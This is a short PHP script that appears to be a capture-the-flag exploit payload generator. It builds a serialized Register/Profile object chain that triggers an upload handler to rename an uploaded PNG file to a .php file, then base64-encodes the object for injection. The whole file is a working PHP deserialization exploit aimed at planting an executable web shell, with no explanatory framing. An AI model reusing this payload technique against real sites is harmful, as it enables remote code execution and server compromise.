<?php
namespace app\web\controller;

class Profile{
}

class Register{}

$a = new Register();
$b = new Profile();
$a->checker = $b;
$a->registed = 0;
$b->index = "upload_img";
$b->checker = 0;
$b->filename_tmp = "./upload/27747a1dfe9c831a0178e2bc093af4da/43fa8b0065be9dc114e60701e51de0b7.png";
$b->filename = "./upload/27747a1dfe9c831a0178e2bc093af4da/43fa8b0065be9dc114e60701e51de0b7.php";
$b->ext = 1;
echo base64_encode(serialize($a));
